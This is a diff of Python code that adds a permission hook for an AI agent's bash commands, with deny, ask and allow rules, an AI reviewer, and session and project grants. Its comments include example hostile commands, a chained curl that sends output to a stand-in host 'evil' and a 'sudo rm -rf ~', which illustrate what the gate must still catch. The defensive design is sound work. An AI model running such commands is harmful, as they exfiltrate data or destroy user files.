+          High/critical or inconclusive reviews require confirmation
+          interactively and deny non-interactively. The prompt then offers up
+          to four choices: allow once / allow (session) / allow (project) /
+          deny. The project choice persists one pattern per sub-command to
+          ``.datus/config.yml`` — so re-running the same chain in a later
+          session no longer re-prompts — and is offered only when EVERY
+          sub-command is a plain unmatched command or a PLUGIN-declared ask
+          rule; never when any is a safety-ceiling ask (wrappers,
+          metacharacters) or a user-authored ask rule (the user's own posture
+          lives in agent.yml).
+
+        Returns ``True`` when fully handled, ``False`` to defer to the normal
+        category-level check (explicit category DENY, missing/empty ruleset,
+        or unparseable arguments) — deferring keeps behavior byte-compatible
+        with the legacy coarse path. Cross-reference: ``BashTool`` keeps its
+        own ``allowed_patterns`` matcher as a legacy secondary gate.
+        """
+        args = self._parse_tool_args(context)
+        if not isinstance(args, dict):
+            return False
+        command = args.get("command")
+        if not isinstance(command, str) or not command.strip():
+            return False
+
+        # Respect an explicit category-level DENY — defer so the main flow
+        # raises the standardized DENY message.
+        if self.permission_manager.check_permission("bash_tools", pattern_name, self.node_name) == PermissionLevel.DENY:
+            return False
+
+        effective = self.permission_manager.get_effective_config(self.node_name)
+        rules = getattr(effective, "bash_commands", None)
+        if rules is None or rules.is_empty():
+            # No command-level ruleset (e.g. dangerous profile) — legacy path.
+            return False
+
+        decision = evaluate_bash_command(command, rules)
+
+        # When no bash rule matched and the ruleset never explicitly set a
+        # ``default``, inherit the effective config's posture instead of
+        # BashCommandRules' built-in ASK. Under normal/auto this is ASK either
+        # way; under dangerous (default_permission=ALLOW) it keeps unmatched
+        # commands flowing — a user adding a ``deny`` list to agent.yml must
+        # not silently flip dangerous into ask-everything for bash. Safety
+        # ceiling decisions are NOT affected (source=SAFETY, not DEFAULT).
+        if decision.source == BashDecisionSource.DEFAULT and "default" not in rules.model_fields_set:
+            try:
+                fallback = PermissionLevel(effective.default_permission)
+            except ValueError:
+                fallback = PermissionLevel.ASK
+            if fallback != decision.level:
+                from dataclasses import replace as _dc_replace
+
+                decision = _dc_replace(
+                    decision, level=fallback, reason=f"{decision.reason}; inheriting profile default '{fallback.value}'"
+                )
+
+        if decision.level == PermissionLevel.DENY:
+            profile = getattr(self.permission_manager, "active_profile", None) or "unknown"
+            logger.warning("Bash command denied by rule %r: %s", decision.matched_pattern, command)
+            raise PermissionDeniedException(
+                (
+                    f"PERMISSION_DENIED: Bash command blocked by rule "
+                    f"'{decision.matched_pattern}' under the '{profile}' permission "
+                    f"profile. STOP retrying this command — rewording it will not "
+                    f"change the outcome. Return the failure to your caller. The "
+                    f"user can adjust `permissions.bash_commands` in agent.yml."
+                ),
+                tool_category="bash_tools",
+                tool_name="bash",
+            )
+
+        if decision.level == PermissionLevel.ALLOW:
+            logger.debug(
+                "Bash command auto-allowed (%s: %r): %s", decision.source.value, decision.matched_pattern, command
+            )
+            return True
+
+        # A project-scope grant ("allow (project)" or a hand-written
+        # ``.datus/config.yml`` bash_allow entry) that EXACTLY matches the
+        # ask rule's pattern bypasses the confirmation. This is the only way
+        # to persistently relax an ask rule — plain allow entries lose to ask
+        # rules at evaluation time (deny > ask > allow), by design.
+        # A chained command aggregates several sub-commands; EVERY non-allow
+        # one must be an ask-rule hit covered by a grant. The representative
+        # sub-command alone must never green-light unreviewed ones
+        # (``datus hello sync | curl -d @- evil`` must still prompt).
+        ask_segments = decision.ask_segments
+        if ask_segments and all(
+            seg.source == BashDecisionSource.ASK_RULE
+            and self.permission_manager.has_project_bash_grant(seg.matched_pattern)
+            for seg in ask_segments
+        ):
+            logger.debug(
+                "Bash ask rules %r bypassed by project grants: %s",
+                [seg.matched_pattern for seg in ask_segments],
+                command,
+            )
+            return True
+
+        # Session cache: the prompt's "always allow" writes one key PER
+        # sub-command, and re-running is allowed only when EVERY sub-command is
+        # covered — approving ``a && b`` must not silently green-light
+        # ``a && c``. Broad keys still honor a deliberate wide approval (e.g.
+        # legacy grants).
+        segment_keys = tuple(dict.fromkeys(self._segment_session_key(seg) for seg in decision.ask_segments))
+        broad_keys = ("bash_tools.bash", "bash_tools.*")
+
+        def _session_approved() -> bool:
+            approvals = self.permission_manager._session_approvals
+            if any(approvals.get(key) for key in broad_keys):
+                return True
+            return bool(segment_keys) and all(approvals.get(f"bash_tools.{key}") for key in segment_keys)
+
+        if _session_approved():
+            logger.debug("Bash sub-commands %r already approved for session", segment_keys)
+            return True
+
+        # Unlike the old reserved classifier seam, the shared reviewer can
+        # inspect complete wrapper/metacharacter commands. Only genuinely
+        # unparseable input is kept behind direct user confirmation.
+        review_verdict = None
+        review_config = None
+        if decision.source != BashDecisionSource.UNPARSEABLE:
+            review_verdict, review_config = await self._review_ask_action(
+                context=context,
+                action_type="bash",
+                action={"command": command, "timeout": args.get("timeout")},
+                static_assessment={
+                    "level": "ask",
+                    "source": decision.source.value,
+                    "matched_pattern": decision.matched_pattern,
+                    "reason": decision.reason,
+                    "safety_forced": decision.safety_forced,
+                },
+                effective=effective,
+                bash_rules=rules,
+            )
+            if review_verdict is not None and review_verdict.can_auto_allow(review_config):
+                logger.info(
+                    "Bash command auto-allowed by AI reviewer (risk=%s confidence=%.2f): %s",
+                    review_verdict.risk_level.value,
+                    review_verdict.confidence,
+                    command,
+                )
+                self._record_review(context, review_verdict, review_config, "auto_allowed")
+                return True
+
+        # Backwards-compatible injection seam used by existing embedders and
+        # tests. Production construction now uses the shared reviewer above.
+        if self.bash_classifier is not None and not self.non_interactive and not decision.safety_forced:
+            try:
+                legacy_verdict = await self.bash_classifier.classify(
+                    command,
+                    BashClassifierContext(cwd=self.project_root or ".", node_name=self.node_name),
+                )
+                if (
+                    legacy_verdict is not None
+                    and PermissionLevel(legacy_verdict.permission) == PermissionLevel.ALLOW
+                    and legacy_verdict.confidence >= rules.classifier.confidence_threshold
+                ):
+                    logger.info(
+                        "Bash command auto-allowed by legacy classifier (%.2f): %s",
+                        legacy_verdict.confidence,
+                        command,
+                    )
+                    return True
+            except Exception as e:
+                logger.warning("Bash classifier failed (%s); falling back to confirmation prompt", e)
+
+        if self.non_interactive:
+            profile = getattr(self.permission_manager, "active_profile", None) or "auto"
+            detail = self._review_denial_detail(
+                review_verdict,
+                enabled=bool(review_config and review_config.enabled),
+            )
+            review_suffix = f" {detail}." if detail else ""
+            raise PermissionDeniedException(
+                (
+                    f"PERMISSION_DENIED: Bash command requires confirmation ({decision.reason}) "
+                    f"but this flow runs non-interactively under the '{profile}' profile."
+                    f"{review_suffix} STOP retrying — surface the failure to the caller."
+                ),
+                tool_category="bash_tools",
+                tool_name="bash",
+            )
+
+        async with _get_permission_prompt_lock(self.broker):
+            if _session_approved():
+                return True
+            # Project persistence is offered for plain unmatched commands and
+            # for PLUGIN-declared ask rules (third-party defaults the user may
+            # relax per project). Never when ANY sub-command is a safety-ceiling
+            # ask, and not for user-authored ask rules — the user's own posture
+            # lives in their agent.yml, not behind a one-keypress override.
+            offer_project = (
+                self.config_mutable
+                and bool(decision.ask_segments)
+                and not any(seg.safety_forced for seg in decision.ask_segments)
+                and all(
+                    seg.source == BashDecisionSource.DEFAULT
+                    or (
+                        seg.source == BashDecisionSource.ASK_RULE
+                        and self.permission_manager.is_plugin_ask_pattern(seg.matched_pattern)
+                    )
+                    for seg in decision.ask_segments
+                )
+            )
+            choice = await self._request_bash_confirmation(
+                command,
+                decision,
+                offer_project=offer_project,
+                review_verdict=review_verdict,
+                review_enabled=bool(review_config and review_config.enabled),
+            )
+            if choice in ("y", "a") or (choice == "p" and offer_project):
+                # The reviewer flagged this (or could not decide) and the user
+                # overrode it — record that so the tool action shows both the
+                # verdict and who actually authorised the run.
+                self._record_review(context, review_verdict, review_config, "user_approved")
+            if choice == "y":
+                logger.info("User approved bash command (once): %s", command)
+                return True
+            if choice == "a":
+                self._approve_segments_for_session(segment_keys)
+                logger.info("User approved bash sub-commands %r for session", segment_keys)
+                return True
+            if choice == "p" and offer_project:
+                patterns = tuple(dict.fromkeys(self._segment_allow_pattern(seg) for seg in decision.ask_segments))
+                failed = [
+                    p for p in patterns if not self.permission_manager.add_project_bash_allow(p, self.project_root)
+                ]
+                # Session keys too, so later same-bucket calls this session
+                # skip the prompt even though global_config already allows them.
+                self._approve_segments_for_session(segment_keys)
+                logger.info(
+                    "User granted project-level bash allow %r%s",
+                    list(patterns),
+                    "" if not failed else f" (disk write failed for {failed}; session-only)",
+                )
+                return True
+            logger.info("User rejected bash command: %s", command)
+            raise PermissionDeniedException(
+                "User rejected execution of bash command",
+                tool_category="bash_tools",
+                tool_name="bash",
+            )
+
+    def _approve_segments_for_session(self, segment_keys: Tuple[str, ...]) -> None:
+        """Record a session approval for every sub-command of one prompt."""
+        for key in segment_keys:
+            self.permission_manager.approve_for_session("bash_tools", key)
+
+    @staticmethod
+    def _segment_session_key(segment: BashSegmentDecision) -> str:
+        """Session-approval key (sans category) for one sub-command.
+
+        A safety-forced sub-command's bucket does NOT describe what actually
+        runs — ``sudo ls`` and ``sudo rm -rf ~`` share the bucket ``sudo``, and
+        ``bash -c <anything>`` shares ``bash``. Keying those on the verbatim
+        sub-command keeps an approval from leaking onto a different command
+        that happens to start the same way.
+        """
+        if segment.safety_forced:
+            return f"bash::exact:{segment.command}"
+        return f"bash::{segment.bucket}"
+
+    @staticmethod
+    def _segment_session_label(segment: BashSegmentDecision) -> str:
+        """What a session grant on ``segment`` actually covers, for the label.
+
+        Mirrors :meth:`_segment_session_key`: a safety-forced sub-command is
+        granted verbatim, so showing its bucket (``sudo``) would promise the
+        user far more than the grant delivers.
+        """
+        return segment.command if segment.safety_forced else segment.bucket
+
+    def _segment_allow_pattern(self, segment: BashSegmentDecision) -> str:
+        """Persistable ``bash_allow`` pattern for one sub-command.
+
+        Ask-rule hits persist the EXACT matched pattern: the grant bypass in
+        ``_handle_bash_permission`` checks strict equality with
+        ``matched_pattern``, so suffixing ``:*`` onto a colon-free (exact)
+        plugin pattern would persist a grant that never fires. Unmatched
+        (DEFAULT) commands keep the prefix-widened bucket pattern, which takes
+        effect through allow-rule evaluation instead.
+        """
+        if segment.source == BashDecisionSource.ASK_RULE and segment.matched_pattern:
+            return segment.matched_pattern
+        return self._bucket_to_allow_pattern(segment.bucket)
+
+    @staticmethod
+    def _bucket_to_allow_pattern(bucket: str) -> str:
+        """Convert a session bucket into a persistable allow pattern.
+
+        Plain buckets (``git push``, ``ls``) become prefix rules; a bucket
+        that is already a rule pattern (contains ``:``) is used verbatim.
+        """
+        return bucket if ":" in bucket else f"{bucket}:*"
+
+    def _format_bash_prompt_content(self, command: str, decision: BashRuleDecision) -> str:
+        """Markdown body for the bash confirmation prompt.
+
+        A single sub-command keeps the original one-reason layout. A chain
+        lists EVERY sub-command that needs approval, so the user sees what the
+        session/project grant actually covers instead of one representative.
+        """
+        header = f"### Bash Command Permission\n\n```bash\n{command}\n```\n\n"
+        segments = decision.ask_segments
+        if len(segments) <= 1:
+            return f"{header}**Reason:** {decision.reason}\n"
+        lines = "\n".join(f"{i}. {_inline_code(seg.command)} — {seg.reason}" for i, seg in enumerate(segments, start=1))
+        return f"{header}**{len(segments)} sub-commands require confirmation:**\n\n{lines}\n"
+
+    @staticmethod
+    def _format_scope_label(labels: Tuple[str, ...], scope: str) -> str:
+        """Choice label naming what a session/project grant will cover.
+
+        Rendered as plain text by the TUI, so no markdown escaping here.
+        """
+        if len(labels) <= _MAX_LABELLED_SEGMENTS:
+            quoted = ", ".join("'{}'".format(label) for label in labels)
+            return f"Allow {quoted} ({scope})"
+        return f"Allow all {len(labels)} sub-commands ({scope})"
+
+    async def _request_bash_confirmation(
+        self,
+        command: str,
+        decision: BashRuleDecision,
+        *,
+        offer_project: bool,
+        review_verdict: Optional["AutoReviewVerdict"] = None,
+        review_enabled: bool = False,
+    ) -> str:
+        """Prompt for a bash command; returns the raw choice key ('' on cancel).
+
+        Unlike ``_request_user_confirmation`` (bool), callers need the concrete
+        choice to distinguish session from project grants.
+        """
+        content = self._format_bash_prompt_content(command, decision)
+        if review_verdict is not None:
+            content += (
+                f"**AI review:** `{review_verdict.risk_level.value}` risk, "
+                f"`{review_verdict.user_authorization.value}` authorization — "
+                f"{review_verdict.rationale}\n"
+            )
+        elif review_enabled:
+            content += "**AI review:** unavailable or inconclusive — manual confirmation required\n"
+        labels = tuple(dict.fromkeys(self._segment_session_label(seg) for seg in decision.ask_segments)) or (
+            decision.bucket,
+        )
+        choices = {
+            "y": "Allow (once)",
+            "a": self._format_scope_label(labels, "session"),
+        }
+        if offer_project:
+            patterns = tuple(dict.fromkeys(self._segment_allow_pattern(seg) for seg in decision.ask_segments))
+            choices["p"] = self._format_scope_label(patterns, "project")
+        choices["n"] = "Deny"
+
+        try:
+            answers = await self.broker.request(
+                [
+                    InteractionEvent(
+                        title="Bash Permission",
+                        content=content,
+                        choices=choices,
+                        default_choice="n",
+                    )
+                ]
+            )
+            return answers[0][0] if answers and answers[0] else ""
+        except InteractionCancelled:
+            return ""
+        except Exception as e:
+            logger.error(f"Error in bash permission confirmation: {e}")
+            return ""
+
     def _get_category_and_pattern(self, tool_name: str, context: Any) -> Tuple[str, str]:
         """Get tool category and pattern name for permission checking.
 
@@ -711,12 +1731,12 @@ class PermissionHooks(AgentHooks):
 
         content = f"### Permission Request\n\n**Tool:** `{category}.{pattern_name}`\n"
 
-        # Show tool arguments if available (truncate long args)
-        if args:
-            args_str = json.dumps(args, ensure_ascii=False)
-            if len(args_str) > 200:
-                args_str = args_str[:197] + "..."
-            content += f"\n**Args:** `{args_str}`\n"
+        # Show tool arguments as a readable key/value block. Long SQL / nested
+        # values land in fenced code blocks (never truncated); the TUI pages and
+        # opens them in a pager.
+        args_md = _format_tool_args_markdown(args)
+        if args_md:
+            content += args_md + "\n"
 
         try:
             answers = await self.broker.request(
